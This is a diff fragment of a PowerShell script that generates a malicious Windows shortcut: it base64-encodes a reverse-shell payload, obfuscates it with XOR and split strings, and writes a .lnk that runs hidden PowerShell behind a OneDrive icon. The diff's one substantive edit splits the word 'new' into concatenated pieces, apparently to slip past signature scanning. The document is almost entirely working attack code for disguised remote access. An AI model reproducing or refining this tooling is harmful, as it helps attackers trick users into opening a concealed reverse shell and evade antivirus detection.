@@ -13,7 +13,7 @@ $b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))
 $strings = @("assembly",'gettype','System.Text.Encoding','System.Convert','ascii','getstring','frombase64string',$b64)
 
 #used to format after string obfuscation and fix formatting errors
-$start = "([string]::nEw([char[]](('"
+$start = "([string]::('n'+'ew')([char[]](('"
 $end = "'"+'|f`hx).bytes|%{$johnxor-'+"$offset})))"
 $fix = @'
 '+"'"+'
@@ -38,7 +38,6 @@ $Shortcut.RelativePath =  "powershell"
 $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
 $Shortcut.Arguments = ("-WindowStyle hidden "+$final)
-$Shortcut.Arguments.Length
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 $ErrorActionPreference='Continue'
